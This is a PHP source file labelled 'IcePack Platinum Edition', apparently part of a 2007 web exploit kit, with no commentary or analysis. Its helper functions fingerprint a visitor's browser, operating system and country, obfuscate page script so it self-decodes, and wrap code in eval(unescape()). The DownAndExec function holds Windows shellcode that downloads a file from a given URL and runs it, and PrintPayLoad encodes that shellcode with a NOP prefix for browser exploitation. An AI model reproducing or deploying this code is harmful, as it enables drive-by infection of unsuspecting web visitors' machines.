<?php
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	IcePack Platinum Edition
-----------------------------------------------------
	2007 (c) IDT Group
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

include "geoip.inc";

function detect_browser()
{
	global $agent, $type, $browser, $bv;
		
	$user_agent = $agent;	
	if (eregi("(opera) ([0-9]{1,2}.[0-9]{1,3}){0,1}", $user_agent, $bv) or 
	    eregi("(opera/)([0-9]{1,2}.[0-9]{1,3}){0,1}", $user_agent, $bv))
	    {
	    	$type    = "Opera";
	    	$browser = "Opera" . " " . $bv[2];
	    }
	    elseif (eregi("(konqueror)/([0-9]{1,2}.[0-9]{1,3})", $user_agent, $bv))
	    {
	    	$type    = "Konqueror";
	    	$browser = "Konqueror" . " " . $bv[2];
	    }
	    elseif (eregi("(lynx)/([0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2})", $user_agent, $bv))
	    {
	    	$type    = "Lynx";
	    	$browser = "Lynx" . " " . $bv[2];
	    }
	    elseif (eregi("(links) \\(([0-9]{1,2}.[0-9]{1,3})", $user_agent, $bv))
	    {
	    	$type    = "Links";
	    	$browser = "Links" . " " . $bv[2];
	    }
	    elseif (eregi("(msie) ([0-9]{1,2}.[0-9]{1,3})", $user_agent, $bv))
	    {
	    	$type    = "Internet Explorer";
	    	$browser = "Internet Explorer" . " " . $bv[2];
	    }
	    elseif (eregi("(netscape6)/(6.[0-9]{1,3})", $user_agent, $bv))
	    {
	    	$type    = "Netscape";
	    	$browser = "Netscape" . " " . $bv[2];
	    }
	    elseif (eregi("(firefox)/([0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2})", $user_agent, $bv) or
	            eregi("(firefox)/([0-9]{1,2}.[0-9]{1,2})", $user_agent, $bv))
	    {
	    	$type    = "Firefox";
	    	$browser = "Firefox" . " " . $bv[2];
	    }	    
	    elseif (eregi("(mozilla)/([0-9]{1,2}.[0-9]{1,3})", $user_agent, $bv))
	    {
	    	$type    = "Mozilla";
	    	$browser = "Mozilla" . " " . $bv[2];
	    }
	    else
	    {
	    	$type    = "Other";
	    	$browser = "Other";
	    }	
	
	return '';
}

function detect_os()
{
	global $agent, $os;
	
	$user_agent = $agent;
	if     (strstr($user_agent, "Windows 95"))     $os = "Windows 95";
	elseif (strstr($user_agent, "Windows NT 4"))   $os = "Windows NT 4";
	elseif (strstr($user_agent, "Windows 98"))     $os = "Windows 98";
	elseif (strstr($user_agent, "Win 9x 4.9"))     $os = "Windows ME";
	elseif (strstr($user_agent, "Windows NT 5.0")) $os = "Windows 2000";
	elseif (strstr($user_agent, "Windows NT 5.1")) $os = "Windows XP";
	elseif (strstr($user_agent, "Windows NT 5.2")) $os = "Windows 2003";
	elseif (strstr($user_agent, "Windows NT 6.0")) $os = "Windows Vista";
	elseif (strstr($user_agent, "Linux"))          $os = "Linux";
	elseif (strstr($user_agent, "Mac OS"))         $os = "Mac OS";
	else                                           $os = "Other";
	
	return "";
}

function detect_country()
{
	global $gi, $ip, $country;
	
	$gi = geoip_open ("GeoIP.dat", GEOIP_STANDARD);
	$country = geoip_country_code_by_addr ($gi, $ip);
	
	if(empty($country)) $country = "O1";
	
	return 0;
}

function _crypt($content)
{
	if(empty($content)) return '';
	
	// Crypt
	$table = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_@";
	$xor   = 165;
	$table = array_keys(count_chars($table, 1));
	$i_min = min($table);
	$i_max = max($table);
	
	for ($c = count($table); $c > 0; $r = mt_rand(0, $c--)) array_splice($table, $r, $c - $r, array_reverse(array_slice($table, $r, $c - $r)));
	$len = strlen($content);
	$word = $shift = 0;
	
	for ($i = 0; $i < $len; $i++)
	{
		$ch = $xor ^ ord($content[$i]);
		$word |= ($ch << $shift);
		$shift = ($shift + 2) % 6;
		$enc .= chr($table[$word & 0x3F]);
		$word >>= 6;
		
		if (!$shift)
		{
			$enc .= chr($table[$word]);
			$word >>= 6;
		}
	}
	
	if ($shift) $enc .= chr($table[$word]);
	
	$tbl = array_fill($i_min, $i_max - $i_min + 1, 0);
	
	while (list($k,$v) = each($table)) $tbl[$v] = $k;
	
	$tbl = implode(",", $tbl);
	
	$fi = ",p=0,s=0,w=0,t=Array({$tbl})";
	$f  = "w|=(t[x.charCodeAt(p++)-{$i_min}])<<s;";
	$f .= "if(s){r+=String.fromCharCode({$xor}^w&255);w>>=8;s-=2}else{s=6}";
	$r = "<script language=JavaScript>";
	$r.= "function dc(x){";
	$r.= "var l=x.length,b=1024,i,j,r{$fi};";
	$r.= "for(j=Math.ceil(l/b);j>0;j--){r='';for(i=Math.min(l,b);i>0;i--,l--){{$f}}document.write(r)}";
	$r.= "}dc(\"{$enc}\")";
	$r.= "</script>";

	return $r;
}

function GetRandomString($length) 
{
	$numbers = "1234567890";
	$letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	$template = $numbers.$letters;
	$rndstring = "";
	
	for ($a = 0; $a <= $length; $a++)
	{
		$b = rand(0, strlen($template) - 1);
		$rndstring .= $template[$b];
	}
	
	$result = $letters[rand(0,strlen($letters) - 1)].$rndstring;
	
	return $result;
}

function DownAndExec($url)
{
	$sc  ="\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03";
	$sc .="\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74";
	$sc .="\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E";
	$sc .="\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03";
	$sc .="\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C";
	$sc .="\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40";
	$sc .="\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C";
	$sc .="\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC";
	$sc .="\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F";
	$sc .="\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB";
	$sc .="\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83";
	$sc .="\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF";
	$sc .="\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF" . $url;
	
	return $sc;
}

function PrintPayLoad($sc)
{
	$result = '';
	
	for($i=0;$i<=strlen($sc);$i+=2)
	{
		$n1 = $sc[$i];
		$n2 = $sc[$i+1];
		$n1 = ord($n1)+ord($n2)*256;
		$n1 = dechex($n1);
		
		while(strlen($n1)<4)
		{
			$n1='0'.$n1;
		}
		$result .= "%u{$n1}";
	}
	return "%u9090%u9090".$result;
}

function uEncode($s)
{
 $res=strtoupper(bin2hex($s));
 $g = round(strlen($res)/4);
 if ($g != (strlen($res)/4)) $res .= "00";
 $out = "";

 for ($i=0; $i<strlen($res); $i+=4)
 {
 	$out.="%u".substr($res, $i+2, 2).substr($res, $i, 2);
 }
 return $out;
}

function crypt_j($str)
{
for($i=0;$i<strlen($str);$i++) 

{$hex=dechex(ord($str[$i])); 

if ($str[$i]=='&') $x .= "$str[$i]"; 

else if ($str[$i]!='\\') @$x.="%$hex"; 
} 
return "eval(unescape('".$x."'));";
}

function ToCharCode($source)
{
	$result = '';
	
	for ($i=0;$i < strlen($source);$i++)
	{
		$result .= ord($source[$i]);
		if ($i != strlen($source)-1) $result .= ',';
	}
	
	return 'String.fromCharCode('.$result.')';
}

?>